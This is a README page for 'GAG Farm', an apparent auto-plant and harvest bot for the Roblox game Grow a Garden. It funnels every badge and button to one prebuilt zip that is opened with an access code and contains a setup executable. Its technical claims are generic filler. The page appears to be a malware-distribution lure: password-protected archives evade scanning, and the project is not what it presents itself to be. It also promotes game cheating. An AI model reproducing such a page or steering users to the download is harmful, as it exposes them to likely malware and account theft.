<div align="center">

# GAG Farm — Grow a Garden Farm — Auto Plant, Water and Harvest Helper (One-Command Setup, Prebuilt Release)

<p><strong>GAG Farm — Grow a Garden Farm — Auto Plant, Water and Harvest Helper (One-Command Setup, Prebuilt Release): GAG Farm — grow-a-garden and autofarm in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/garden-autofarm?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download garden-autofarm-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip"><img src="banner.svg" alt="GAG Farm Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**GAG Farm — GAG Farm — grow-a-garden and autofarm in one tool** (`garden-autofarm`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`garden-autofarm-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`garden-autofarm-v0.1.0-win64.zip`](../../releases/download/v0.1.0/garden-autofarm-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `GardenAutofarm_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## FAQ

<details>
<summary><b>What does it automate?</b></summary>

Planting, watering and harvest timing.
</details>
<details>
<summary><b>Multiple gardens?</b></summary>

Per-slot configs.
</details>
<details>
<summary><b>Alerts?</b></summary>

Desktop + webhook.
</details>

## Configuration (`config/settings.json`)

```json
{
  "module": "garden-autofarm",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "farmer": {
      "enabled": true
    },
    "cycles": {
      "enabled": true
    },
    "alerts": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/garden-autofarm.git
cd garden-autofarm
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: garden-autofarm, roblox, autofarm, harvest, plant, helper, gaming-tools, automation, grow-a-garden, cli, developer-tools, open-source, windows, productivity, cpp, portable, prebuilt, tools</sub>
